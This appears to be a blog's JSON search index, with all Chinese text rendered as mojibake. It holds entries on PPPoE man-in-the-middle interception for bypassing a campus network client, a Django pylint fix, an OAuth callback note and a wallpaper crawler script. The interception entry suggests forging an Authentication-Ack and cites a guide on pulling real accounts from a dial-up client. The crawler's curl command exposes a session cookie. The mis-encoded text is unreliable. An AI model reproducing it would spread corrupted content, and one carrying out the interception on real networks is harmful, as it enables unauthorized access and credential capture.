æˆ‘ç”¨å·¥å…·æ­å»ºäº†ä¸€ä¸ªTAPç½‘å¡ï¼Œæˆ‘ç”¨ wireshark çœ‹äº†ä¸‹ï¼ŒåŒ…çš„æµç»æ˜¯å…ˆç»è¿‡ TAP ç½‘å¡ï¼Œç„¶å TAP ä¼šä½œä¸ºä¸€ä¸ªäºŒå±‚äº¤æ¢æœºï¼Œä¿®æ”¹æº mac å’Œç›®æ ‡ mac åå‘å¾€ä»¥å¤ªç‰©ç†ç½‘å¡ï¼Œç„¶åæˆ‘é‡‡ç”¨ server ç›‘å¬ TAP ç½‘å¡ï¼Œå‘å“åº”åŒ…é‡‡ç”¨ç‰©ç†ç½‘å¡ï¼Œä½†æ˜¯ä¾æ—§æ˜¯åç»­è¿›è¡Œä¸ä¸‹å»ï¼Œè™½è¯´è¿™ä¸¤ä¸ªmacä¸ä¸€æ ·ï¼Œä½†æ˜¯ client é‚£è¾¹ä¾æ—§æ²¡å“åº”ï¼Œä¸çŸ¥é“æ˜¯ client ä¸¢å¼ƒäº†è¿™ä¸ªåŒ…è¿˜æ˜¯è¯´ client é‚£è¾¹æ²¡æ”¶åˆ°ã€‚ è§£å†³ å½“ç„¶è¿™ä¸ªé—®é¢˜åˆ°æœ€åè§£å†³äº†ï¼Œè¿™é‡Œæ„Ÿè°¢ä¸€ä¸‹è€é™ˆçš„æŒ‡ç‚¹ã€‚\nå…¶å®æ¯”è¾ƒç®€å•ï¼Œé—®é¢˜å°±æ˜¯ npcapï¼Œæ¯•ç«Ÿ scapy å’Œ wireshark éƒ½æ¨èè¿™ä¸ªï¼Œæˆ‘ä¹Ÿå°±é‡‡ç”¨äº†è¿™ä¸ªï¼Œä½†æ˜¯å°±åƒå‰é¢æ‰€è¯´çš„ï¼Œå°±ç®—ä¼ªé€  macï¼Œåº”è¯¥ä¹Ÿä¼šæµç»ç‰©ç†ç½‘å¡ï¼Œä½†æ˜¯ npcap æœ¬åœ°å‘çš„åŒ…æ”¶ä¸åˆ°clientå“åº”åŒ…ã€‚\næ‰€ä»¥é‡‡ç”¨ winpcap å°±èƒ½æ­£å¸¸äº†ï¼ŒåŒ…æ‹¬ä¸¤ä¸ª mac ç›¸åŒä¹Ÿå¯ä»¥æŠ“åˆ°ã€‚\nè‡³äºè¿™ä¸ªå…·ä½“æ˜¯ä»€ä¹ˆå¯¼è‡´çš„ï¼Œè¿˜æ˜¯è¯´æ˜¯ä¸€ä¸ª bugï¼Œå¹¶ä¸æ˜¯å¤ªæ¸…æ¥šã€‚\nä½ è¿˜å¯ä»¥åšå“ªäº›æœ‰è¶£çš„äº‹æƒ… æ‹¦æˆªä»¥åï¼Œä½ å¯ä»¥è‡ªå·±é…åˆè‡ªå·±çš„è·¯ç”±å™¨è¿›è¡Œæ‹¨å·ã€‚\nç”šè‡³å¤§èƒ†ä¸€ç‚¹ï¼Œä½ ä¹Ÿå¯ä»¥å°è¯•ç»™å®¢æˆ·ç«¯ä¸€ä¸ªæˆåŠŸçš„ Authentication-Ackï¼Œçœ‹å®¢æˆ·ç«¯ä¼šæ˜¯ä»€ä¹ˆæ•ˆæœï¼Œè¦æ˜¯ä½ ç»§ç»­æ¨¡æ‹Ÿå®Œæ•´ä¸ªæµç¨‹ï¼ŒåŒ…æ‹¬ IPCPï¼Œé‚£ä¹ˆå®¢æˆ·ç«¯ä¼šæŒ‰ç…§ä½ çš„æƒ³æ³•ç»™ä½ å‘é€å¿ƒè·³åŒ…å—ï¼Ÿ\nä»£ç åœ°å€ PPPoE-Intercept\nå‚è€ƒèµ„æ–™ How To : ä»Netkeeper 4.Xå®¢æˆ·ç«¯è·å–çœŸå®è´¦å· RFC 2516 - A Method for Transmitting PPP Over Ethernet (PPPoE) RFC 1570 - PPP LCP Extensions RFC 1661 - The Point-to-Point Protocol (PPP) ç‚¹åˆ°ç‚¹åè®®PPP-ç™¾åº¦æ–‡åº“ PPPï¼ˆthree Pï¼‰åŸºæœ¬åŸç† PPPoE-hijack PPPoEå·¥ä½œåŸç†ä»¥åŠPPPoEå¸§æ ¼å¼ è‡´è°¢ æ„Ÿè°¢è¸©å‘æ— åŠ©çš„æ—¶å€™è€é™ˆçš„æç‚¹\n","permalink":"https://www.hacktech.cn/post/pppoe-server-mitm.html","summary":"\u003cblockquote\u003e\n\u003cp\u003eæœ¬æ–‡é¦–å‘äº\u003ca href=\"https://www.anquanke.com/post/id/178484\"\u003ePPPoEä¸­é—´äººæ‹¦æˆªä»¥åŠæ ¡å›­ç½‘çªç ´æ¼«è°ˆ\u003c/a\u003eï¼Œè½¬è½½è¯·æ³¨æ˜å‡ºå¤„ã€‚\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003ch1 id=\"pppoeä¸­é—´äººæ‹¦æˆªä»¥åŠæ ¡å›­ç½‘çªç ´æ¼«è°ˆ\"\u003ePPPoEä¸­é—´äººæ‹¦æˆªä»¥åŠæ ¡å›­ç½‘çªç ´æ¼«è°ˆ\u003c/h1\u003e\n\u003cp\u003eæ ¡å›­ç”Ÿæ´»å¿«ç»“æŸäº†ï¼Œä¹‹å‰è¿˜æœ‰ç‚¹æœªå®Œæˆçš„æƒ³æ³•ï¼Œè¶ç€è¿™ä¸¤å¤©æœ‰å…´è¶£ææã€‚\u003c/p\u003e\n\u003cp\u003eæ­¤æ–‡é¢å‘å¤§ä¼—æ˜¯é‚£ç§åœ¨æ ¡å›­å†…è‹¦å—æ‹¨å·å®¢æˆ·ç«¯çš„æ¯’å®³ï¼Œä½†æ˜¯åˆæƒ³è‡ªå·±åŠ¨æ‰‹æŠ˜è…¾ä¸‹çš„ã€‚\u003c/p\u003e","title":"PPPoEä¸­é—´äººæ‹¦æˆªä»¥åŠæ ¡å›­ç½‘çªç ´æ¼«è°ˆ"},{"content":"vscode æ‰“å¼€ django é¡¹ç›®æç¤º has not \u0026ldquo;object\u0026rdquo; member æ˜¯å› ä¸º Django åŠ¨æ€åœ°å°†å±æ€§æ·»åŠ åˆ°æ‰€æœ‰æ¨¡å‹ç±»ä¸­ï¼Œæ‰€ä»¥ ide æ— æ³•è§£æã€‚\nè§£å†³æ–¹æ¡ˆï¼š\nå®‰è£… pylint-django 1 pip install -U pylint-django å¯ç”¨ pylint-django æ‰“å¼€é¡¹ç›®ä¸‹è‡ªåŠ¨ç”Ÿæˆçš„ .vscode æ–‡ä»¶å¤¹ä¸‹çš„ setting.json æ–‡ä»¶ï¼Œæ·»åŠ ä¸‹é¢çš„é…ç½®é¡¹ã€‚\n1 2 3 \u0026#34;python.linting.pylintArgs\u0026#34;: [ \u0026#34;--load-plugins=pylint_django\u0026#34; ] ","permalink":"https://www.hacktech.cn/post/vscode-django-pylint-error.html","summary":"\u003cp\u003evscode æ‰“å¼€ django é¡¹ç›®æç¤º has not \u0026ldquo;object\u0026rdquo; member æ˜¯å› ä¸º Django åŠ¨æ€åœ°å°†å±æ€§æ·»åŠ åˆ°æ‰€æœ‰æ¨¡å‹ç±»ä¸­ï¼Œæ‰€ä»¥ ide æ— æ³•è§£æã€‚\u003c/p\u003e\n\u003c!-- more --\u003e\n\u003cp\u003eè§£å†³æ–¹æ¡ˆï¼š\u003c/p\u003e\n\u003col\u003e\n\u003cli\u003eå®‰è£… pylint-django\u003c/li\u003e\n\u003c/ol\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cdiv style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\n\u003ctable style=\"border-spacing:0;padding:0;margin:0;border:0;\"\u003e\u003ctr\u003e\u003ctd style=\"vertical-align:top;padding:0;margin:0;border:0;\"\u003e\n\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e1\n\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/td\u003e\n\u003ctd style=\"vertical-align:top;padding:0;margin:0;border:0;;width:100%\"\u003e\n\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-fallback\" data-lang=\"fallback\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003epip install -U pylint-django\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/td\u003e\u003c/tr\u003e\u003c/table\u003e\n\u003c/div\u003e\n\u003c/div\u003e\u003col start=\"2\"\u003e\n\u003cli\u003eå¯ç”¨ pylint-django\u003c/li\u003e\n\u003c/ol\u003e\n\u003cp\u003eæ‰“å¼€é¡¹ç›®ä¸‹è‡ªåŠ¨ç”Ÿæˆçš„ .vscode æ–‡ä»¶å¤¹ä¸‹çš„ setting.json æ–‡ä»¶ï¼Œæ·»åŠ ä¸‹é¢çš„é…ç½®é¡¹ã€‚\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cdiv style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\n\u003ctable style=\"border-spacing:0;padding:0;margin:0;border:0;\"\u003e\u003ctr\u003e\u003ctd style=\"vertical-align:top;padding:0;margin:0;border:0;\"\u003e\n\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e1\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e2\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e3\n\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/td\u003e\n\u003ctd style=\"vertical-align:top;padding:0;margin:0;border:0;;width:100%\"\u003e\n\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-gdscript3\" data-lang=\"gdscript3\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;python.linting.pylintArgs\u0026#34;\u003c/span\u003e: [\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;--load-plugins=pylint_django\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    ]\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/td\u003e\u003c/tr\u003e\u003c/table\u003e\n\u003c/div\u003e\n\u003c/div\u003e","title":"vscodeæ‰“å¼€djangoé¡¹ç›®pylintæç¤ºhas not \"object\" member"},{"content":"è¿™ä¸ªéšä¾¿è®°å½•ä¸€ä¸‹ï¼Œä¹Ÿæ˜¯æœ‹å‹é—®æˆ‘çš„ä¸€ä¸ªé—®é¢˜ã€‚\nåœ¨ç½‘ä¸Šæ‰¾äº†ä¸‹ï¼Œæ²¡æ‰¾åˆ°ç›¸å…³çš„ï¼Œç”¨è‹±æ–‡ä¹Ÿæœç´¢äº†ä¸€ä¸‹ï¼Œå¯èƒ½æˆ‘çš„å…³é”®è¯æ²¡æ‰¾å¯¹ï¼Œæ‰¾äº†ä¸€ä¼šæ²¡æ‰¾åˆ°ã€‚\næƒ³åˆ°ä»¥å‰ç”¨è¿‡çš„rcloneä¹Ÿæ˜¯ç”¨çš„è¿™æ ·çš„æ–¹å¼ï¼Œå»çœ‹äº†ä¸‹ç›¸å…³éƒ¨åˆ†æºç ã€‚\nè§£å†³æ–¹æ¡ˆæ˜¯æœ¬åœ°æ­å»ºä¸€ä¸ª webserver ç”¨æ¥è·å–å‡­è¯ï¼Œç„¶åå®¢æˆ·ç«¯å°±èƒ½æ‹¿åˆ°äº†ã€‚\n","permalink":"https://www.hacktech.cn/post/get-auth-and-back-to-client.html","summary":"\u003cp\u003eè¿™ä¸ªéšä¾¿è®°å½•ä¸€ä¸‹ï¼Œä¹Ÿæ˜¯æœ‹å‹é—®æˆ‘çš„ä¸€ä¸ªé—®é¢˜ã€‚\u003c/p\u003e\n\u003cp\u003eåœ¨ç½‘ä¸Šæ‰¾äº†ä¸‹ï¼Œæ²¡æ‰¾åˆ°ç›¸å…³çš„ï¼Œç”¨è‹±æ–‡ä¹Ÿæœç´¢äº†ä¸€ä¸‹ï¼Œå¯èƒ½æˆ‘çš„å…³é”®è¯æ²¡æ‰¾å¯¹ï¼Œæ‰¾äº†ä¸€ä¼šæ²¡æ‰¾åˆ°ã€‚\u003c/p\u003e\n\u003c!-- more --\u003e\n\u003cp\u003eæƒ³åˆ°ä»¥å‰ç”¨è¿‡çš„rcloneä¹Ÿæ˜¯ç”¨çš„è¿™æ ·çš„æ–¹å¼ï¼Œå»çœ‹äº†ä¸‹ç›¸å…³éƒ¨åˆ†æºç ã€‚\u003c/p\u003e\n\u003cp\u003eè§£å†³æ–¹æ¡ˆæ˜¯æœ¬åœ°æ­å»ºä¸€ä¸ª webserver ç”¨æ¥è·å–å‡­è¯ï¼Œç„¶åå®¢æˆ·ç«¯å°±èƒ½æ‹¿åˆ°äº†ã€‚\u003c/p\u003e","title":"ä»å®¢æˆ·ç«¯å–åˆ°æµè§ˆå™¨è¿”å›çš„oauthå‡­è¯"},{"content":"å¥½ä¹…æ²¡å†™ä¸œè¥¿äº†ï¼Œéšä¾¿æ°´ä¸€ç¯‡æ–‡ï¼Œä¹Ÿæ˜¯æ¯”è¾ƒç®€å•çš„ä¸œè¥¿\nå¯èƒ½æ¯ä¸ªå–œæ¬¢äºŒæ¬¡å…ƒçš„äººéƒ½æœ‰è‡ªå·±çš„è€å©†æˆ–è€…è€å…¬å§ï¼Œä¹‹å‰åœ¨æœ‹å‹é‚£é‡Œçœ‹åˆ°äº†ä¸€ä¸ªå£çº¸ç½‘ç«™wall.alphacoders.comï¼Œè¦æ˜¯æˆ‘æƒ³è¦äºšä¸å¨œçš„å£çº¸ï¼Œåªéœ€è¦æœç´¢å¥¹çš„è‹±æ–‡åAsunaå³å¯çœ‹åˆ°ä¸€åƒå¤šå¼ æœ‰å…³äºšä¸å¨œçš„å£çº¸ã€‚å£çº¸æ”¶é›†çˆ±å¥½è€…è‚¯å®šå°±å’Œæˆ‘ä¸€æ ·æƒ³æŠŠå®ƒä»¬ç»™ä¸‹è½½åˆ°è‡ªå·±çš„ç”µè„‘ä¸Šå¹»ç¯ç‰‡å½“ä½œå£çº¸äº†ï¼Œå½“ç„¶æ‰‹å·¥ä¸‹è½½æ˜¯ä¸å¯èƒ½çš„ï¼Œå¿…é¡»å†™ä¸‹çˆ¬è™«ï¼Œåˆ†æä¸‹å£çº¸ä¸‹è½½æµç¨‹ã€‚\nè¯·æ±‚åˆ†æ é¦–å…ˆæˆ‘ä»¬F12æ‰“å¼€å¼€å‘è€…å·¥å…·ï¼Œåœ¨ä¸€å¼ å›¾ä¸Šæ‰¾åˆ°ä¸‹è½½\næˆ‘ä»¬åœ¨å¼€å‘è€…å·¥å…·é‡Œé¢å–å…ƒç´ ï¼Œå¹¶æ²¡æœ‰çœ‹åˆ°ä¸‹è½½é“¾æ¥ï¼Œè¯´æ˜ä¸‹è½½é“¾æ¥å¹¶æ²¡æœ‰åŒ…å«åœ¨åŸå§‹htmlä¸­ï¼Œä½†æ˜¯ç‚¹å‡»æ˜¯å¯ä»¥ä¸‹è½½çš„ï¼Œå¹¶ä¸”å¯ä»¥çœ‹åˆ°æ•´ä¸ªé¡µé¢å¹¶æ²¡æœ‰è¿›è¡Œåˆ·æ–°ï¼Œåˆ¤æ–­æ˜¯ä¸€ä¸ªajaxè¯·æ±‚ï¼Œç›´æ¥ç‚¹è¿›XHRï¼Œç„¶åå†æ¬¡ç‚¹å‡»ä¸‹è½½é“¾æ¥å¯ä»¥çœ‹åˆ°è¯·æ±‚ã€‚\nå¯ä»¥çœ‹åˆ°è¿™ä¸ªè¯·æ±‚è¿”å›äº†ä¸€ä¸ªé“¾æ¥ï¼Œæˆ‘ä»¬ç›´æ¥è®¿é—®é“¾æ¥ï¼Œå‘ç°æ˜¯å¯ä»¥ä¸‹è½½çš„ï¼Œè¯´æ˜è¿™å°±æ˜¯ä¸‹è½½é“¾æ¥äº†ï¼Œé‚£ä¹ˆè¿™ä¸ªé“¾æ¥æ˜¯æ€ä¹ˆæ¥çš„å‘¢ï¼Ÿ\næˆ‘ä»¬çœ‹çœ‹è¯·æ±‚ï¼Œè¿™ä¸ªpostè¯·æ±‚é‡Œé¢æœ‰ä¸€äº›å‚æ•°ï¼Œæˆ‘ä»¬å…ˆä¸å»è€ƒè™‘è¿™äº›å‚æ•°æ€ä¹ˆæ¥çš„ï¼Œæˆ‘ä»¬å…ˆæ¨¡æ‹Ÿä¸€ä¸‹è¯·æ±‚çœ‹çœ‹è¯·æ±‚Headeré‡Œé¢æœ‰æ²¡æœ‰ä»€ä¹ˆä¸œè¥¿æ˜¯å¿…é¡»çš„ï¼Œè¿™é‡Œç›´æ¥ä¸Špostmanæˆ–è€…curléƒ½å¯ä»¥ï¼Œå¦‚æœä½ çš„æœºå™¨ä¸Šé¢å®‰è£…äº†curlæˆ‘æ¨èç”¨è¿™ä¸ªï¼Œå› ä¸ºChromeå¼€å‘è€…å·¥å…·ï¼Œç›´æ¥å¯ä»¥åœ¨è¯·æ±‚ä¸Šå³é”®Copy as cURLï¼Œç›´æ¥å¯ä»¥å¸®ä½ å¤åˆ¶å‡ºcurlå‘½ä»¤ï¼Œæˆ‘è¿™é‡Œå¤åˆ¶å‡ºæ¥æ˜¯è¿™æ ·çš„\n1 curl \u0026#34;https://wall.alphacoders.com/get_download_link.php\u0026#34; -H \u0026#34;Pragma: no-cache\u0026#34; -H \u0026#34;Origin: https://wall.alphacoders.com\u0026#34; -H \u0026#34;Accept-Encoding: gzip, deflate, br\u0026#34; -H \u0026#34;Accept-Language: zh-CN,zh;q=0.9\u0026#34; -H \u0026#34;User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Safari/537.36\u0026#34; -H \u0026#34;Content-Type: application/x-www-form-urlencoded; charset=UTF-8\u0026#34; -H \u0026#34;Accept: */*\u0026#34; -H \u0026#34;Cache-Control: no-cache\u0026#34; -H \u0026#34;X-Requested-With: XMLHttpRequest\u0026#34; -H \u0026#34;Cookie: __cfduid=d7ec945393d1b5ef3c28d4c9d12ef9fb11552315444; cookieconsent_status=allow; wa_session=1eogv8ehgn3itq5g4g8hfsducpkm9lbu46q893vrkhph3ued4rm89gvk7ck4fdg9k73cmrcdesoqj4crm1575vj3lfid9e67fpis661\u0026#34; -H \u0026#34;Connection: keep-alive\u0026#34; -H \u0026#34;Referer: https://wall.alphacoders.com/search.php?search=Asuna\u0026#34; --data \u0026#34;wallpaper_id=533007^\u0026amp;type=png^\u0026amp;server=images8^\u0026amp;user_id=79150\u0026#34; --compressed æˆ‘ä»¬å…ˆå»æ‰ä¸å¿…è¦çš„ä¸œè¥¿ curl \u0026quot;https://wall.alphacoders.com/get_download_link.php\u0026quot; --data \u0026quot;wallpaper_id=533007\u0026amp;type=png\u0026amp;server=images8\u0026amp;user_id=79150\u0026quot; ï¼Œç›´æ¥æ‰§è¡Œï¼Œå‘ç°å¯ä»¥è·å–åˆ°åœ°å€ï¼Œæ‰€ä»¥ç°åœ¨è¦è€ƒè™‘çš„åªæœ‰è¿™äº›å‚æ•°æ˜¯æ€ä¹ˆæ¥çš„äº†ï¼Œä¸‹é¢æˆ‘åŒæ ·æ”¾ä¸€å¼ postmançš„å›¾ï¼Œå¯ä»¥çœ‹åˆ°æ˜¯åŒæ ·çš„å¯ä»¥è·å–åˆ°ä¸‹è½½é“¾æ¥\nè¿™äº›å‚æ•°æˆ‘ä»¬ä»ä¸¤æ–¹é¢è€ƒè™‘ï¼Œä¸€æ˜¯ç”¨jsç®—å‡ºæ¥çš„ï¼Œä¸€ä¸ªå°±æ˜¯åœ¨htmlä¸­å­˜åœ¨çš„ã€‚\næˆ‘ä»¬é¦–å…ˆåœ¨htmlé‡Œæ‰¾æ‰¾çœ‹æœ‰æ²¡æœ‰ã€‚\né€šè¿‡å…³é”®å­—æœç´¢é¡µé¢htmlï¼Œæˆ‘ä»¬å¯ä»¥æ‰¾åˆ°æ¯ä¸€å¼ å›¾éƒ½æœ‰ä¸€ä¸²ç±»ä¼¼äºä¸‹é¢çš„å±æ€§\n1 data-id=\u0026#34;533007\u0026#34; data-type=\u0026#34;png\u0026#34; data-server=\u0026#34;images8\u0026#34; data-user-id=\u0026#34;79150\u0026#34; å’Œä¸Šé¢çš„postå‚æ•°æ˜¯ä¸€ä¸€å¯¹åº”çš„ã€‚\næ‰€ä»¥çˆ¬å–æ€è·¯å°±å‡ºæ¥äº†ã€‚\nè®¿é—®ä¸€ä¸ªé¡µé¢ï¼Œå–åˆ°æ¯ä¸€ä¸ªå›¾çš„ç‰¹å®šå±æ€§ï¼Œç„¶åæ„é€ postè¯·æ±‚å¾—åˆ°ä¸‹è½½åœ°å€ï¼Œç„¶åè®¿é—®åœ°å€ä¸‹è½½å›¾ç‰‡\né‚£æ–°é—®é¢˜æ˜¯å¦‚æœè¿›è¡Œç¿»é¡µå¹¶ä¸”åˆ¤æ–­æ˜¯å¦åˆ°äº†æœ€åä¸€é¡µã€‚\næˆ‘ä»¬å¯ä»¥å‘ç°é¡µæ•°æ˜¯é€šè¿‡getçš„ç½‘å€å†³å®šçš„ï¼Œhttps://wall.alphacoders.com/search.php?search=asuna\u0026amp;page=10 ï¼Œæ›´æ”¹pageåé¢çš„å€¼å³å¯ã€‚\nåˆ¤æ–­æ˜¯å¦åˆ°äº†å°¾é¡µï¼Œæˆ‘ä»¬å¯ä»¥æ‰“å¼€æœ€åä¸€é¡µï¼Œç„¶åæŸ¥çœ‹ä¸€ä¸‹htmlï¼Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°ä¸‹ä¸€é¡µæŒ‰é’®çš„é“¾æ¥å·²ç»å˜æˆäº† \u0026lt;a id='next_page' href='#'\u0026gt;Next\u0026amp;nbsp;\u0026amp;#62;\u0026lt;/a\u0026gt; Â·ï¼Œé‚£æˆ‘ä»¬å°±å¯ä»¥æ ¹æ®hrefçš„å€¼æ˜¯å¦ä¸º # æ¥åˆ¤æ–­äº†ã€‚\nPythonåº“çš„é€‰æ‹© å”¯ä¸€ç”¨åˆ°çš„ç¬¬ä¸‰æ–¹åº“å°±æ˜¯ Requests ï¼Œä»¥å‰è§£æhtmlçš„Domæ ‘å–œæ¬¢ç”¨BeautifulSoupï¼Œä½†æ˜¯åæ¥å‘ç°è§£æé€Ÿåº¦ä¸Šç¡®å®å’Œreæœ‰å¾ˆå¤§å·®è·ï¼Œå¹¶ä¸”å½“htmlæœ‰å¾ˆç‰¹æ®Šçš„å­—ç¬¦æ—¶ä¼šåˆæ˜¯è«åå‡ºé”™ï¼Œæ•…å·¥ç¨‹é‡ä¸å¤§çš„æƒ…å†µä¸‹ï¼Œæˆ‘ç°åœ¨è¿˜æ˜¯ä¼˜é€‰æ­£åˆ™ã€‚\nä»£ç  1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 #coding=utf-8 import requests import re import os import sys proxies = { \u0026#34;http\u0026#34;: \u0026#34;http://127.0.0.1:1080\u0026#34;, \u0026#34;https\u0026#34;: \u0026#34;http://127.0.0.1:1080\u0026#34;, } #proxies = {} download_dir = \u0026#39;./pic/\u0026#39; downloaded_num = 0 total = 0 def download_pic(url, name, pic_type): global proxies global download_dir global downloaded_num global total # if dir isn\u0026#39;t exist, create a dir to download pic if not os.path.exists(download_dir): os.makedirs(download_dir) # download pic to special dir r = requests.get(url, proxies=proxies) downloaded_num += 1 with open(\u0026#39;%s/%s.%s\u0026#39;%(download_dir, name, pic_type), \u0026#39;wb\u0026#39;) as f: f.write(r.content) print(\u0026#39;[{:5d}/{}] {}.{} Done!\u0026#39;.format(downloaded_num, total, name, pic_type)) def get_download_link(wallpaper_id, wallpaper_type, server, user_id): global proxies post_data = { \u0026#39;wallpaper_id\u0026#39;: wallpaper_id, \u0026#39;type\u0026#39;: wallpaper_type, \u0026#39;server\u0026#39;: server, \u0026#39;user_id\u0026#39;: user_id, } r = requests.post(\u0026#39;https://wall.alphacoders.com/get_download_link.php\u0026#39;, data=post_data, proxies=proxies) download_pic(r.text, wallpaper_id, wallpaper_type) def getwallpaper(keyword): global proxies global total p_nextpage = re.compile(r\u0026#34;\u0026lt;a id=\u0026#39;next_page\u0026#39; href=[\\\u0026#39;\\\u0026#34;](.+?)[\\\u0026#39;\\\u0026#34;]\u0026gt;\u0026#34;) p_item = re.compile(r\u0026#39;data-id=\u0026#34;(\\d+?)\u0026#34; data-type=\u0026#34;(\\w+?)\u0026#34; data-server=\u0026#34;(\\w+?)\u0026#34; data-user-id=\u0026#34;(\\d+?)\u0026#34;\u0026#39;) page_num = 1 while 1: r_page = requests.get(\u0026#39;https://wall.alphacoders.com/search.php?search=%s\u0026amp;lang=Chinese\u0026amp;page=%d\u0026#39; % (keyword.lower(), page_num), proxies=proxies) nextpage_link = p_nextpage.search(r_page.text) # if there isn\u0026#39;t any search result, it will exit the loop if nextpage_link == None: print(\u0026#34;Sorry, we have no results for your search!\u0026#34;) break if page_num == 1: total = int(re.search(r\u0026#34;\u0026lt;h1 class=\u0026#39;center title\u0026#39;\u0026gt;\\s+?(\\d+)(.+?)\\s+?\u0026lt;/h1\u0026gt;\u0026#34;, r_page.text).group(1)) print(\u0026#34;the %s wallpaper\u0026#39;s total is %d\u0026#34; % (keyword, total)) for item in p_item.findall(r_page.text): wallpaper_id = item[0] wallpaper_type = item[1] server = item[2] user_id = item[3] get_download_link(wallpaper_id, wallpaper_type, server, user_id) # if there isn\u0026#39;t the next page\u0026#39;s link, it will exit the loop if nextpage_link.group(1) == \u0026#39;#\u0026#39;: print(\u0026#34;All wallpaper done!\u0026#34;) break page_num += 1 if __name__ == \u0026#39;__main__\u0026#39;: if len(sys.argv) \u0026lt; 2 or len(sys.argv) \u0026gt; 3: usage_text = \u0026#34;Usage:\\n\\tpython getwallpaper.py miku [miki_pic]\\nFirst param: the name of script\\nSecond param: the wallpaper\u0026#39;s keyword which you want to search\\nThird param: the dir\u0026#39;s name where you want to download in, optional, default in ./pic\u0026#34; print(usage_text) elif len(sys.argv) == 3: download_dir = str(sys.argv[2]) getwallpaper(str(sys.argv[1])) else: getwallpaper(str(sys.argv[1])) å¤šè¯´çš„ é‡Œé¢æˆ‘ç”¨äº†ä¸‹æœ¬æœºçš„ä»£ç†ï¼Œæ‡‚çš„äººè‡ªç„¶æ‡‚ï¼Œä¸»è¦æ˜¯å› ä¸ºç›´è¿ä¸‹è½½ç¡®å®æœ‰ç‚¹æ…¢ã€‚ å¦å¤–è‡ªå·±æ‡’ï¼Œæœ¬æ¥å°±æ˜¯ä¸´æ—¶åå¤šåˆ†é’Ÿå†™çš„ä¸€ä¸ªè„šæœ¬ï¼Œå°±æ‡’å¾—åŠ å¤šçº¿ç¨‹äº†ã€‚\nè‡ªå·±å‘äº†ä¸ªæ— å£°è§†é¢‘ï¼Œä¹Ÿå°±æ˜¯å¯¹æˆ‘è®²è§£ä¸­çš„æ¼”ç¤ºï¼Œéœ€è¦çš„å¯ä»¥çœ‹è¿™é‡Œhttps://www.bilibili.com/video/av46184510/\n","permalink":"https://www.hacktech.cn/post/wall-alphacoders-com-crawler.html","summary":"\u003cp\u003eå¥½ä¹…æ²¡å†™ä¸œè¥¿äº†ï¼Œéšä¾¿æ°´ä¸€ç¯‡æ–‡ï¼Œä¹Ÿæ˜¯æ¯”è¾ƒç®€å•çš„ä¸œè¥¿\u003c/p\u003e\n\u003c!-- more --\u003e\n\u003cp\u003eå¯èƒ½æ¯ä¸ªå–œæ¬¢äºŒæ¬¡å…ƒçš„äººéƒ½æœ‰è‡ªå·±çš„è€å©†æˆ–è€…è€å…¬å§ï¼Œä¹‹å‰åœ¨æœ‹å‹é‚£é‡Œçœ‹åˆ°äº†ä¸€ä¸ªå£çº¸ç½‘ç«™\u003ca href=\"https://wall.alphacoders.com\"\u003ewall.alphacoders.com\u003c/a\u003eï¼Œè¦æ˜¯æˆ‘æƒ³è¦äºšä¸å¨œçš„å£çº¸ï¼Œåªéœ€è¦æœç´¢å¥¹çš„è‹±æ–‡å\u003ccode\u003eAsuna\u003c/code\u003eå³å¯çœ‹åˆ°ä¸€åƒå¤šå¼ æœ‰å…³äºšä¸å¨œçš„å£çº¸ã€‚å£çº¸æ”¶é›†çˆ±å¥½è€…è‚¯å®šå°±å’Œæˆ‘ä¸€æ 